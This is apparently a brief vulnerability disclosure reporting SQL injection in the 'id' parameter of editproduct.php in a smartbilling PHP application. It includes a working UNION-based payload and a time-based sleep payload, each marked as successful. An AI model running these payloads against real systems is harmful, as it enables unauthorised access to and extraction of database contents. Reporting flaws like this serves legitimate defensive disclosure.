BUG_Author: lixu

Vulnerability File: /smartbilling_source_code/editproduct.php

GET parameter "id" exists SQL injection vulnerability

Payload1: id=-1 union all select null,null,null,null,concat(0x565758,0x686970),null,null,null,null-- -

Union query succeeded

![image](https://github.com/niyuchunqiu/cve/blob/main/sql1.png)

Payload2:id=2 and (select 2 from (select(sleep(15)))i)

Time-based injection succeeds, response time is 15 seconds

![image](https://github.com/niyuchunqiu/cve/blob/main/sql2.png)

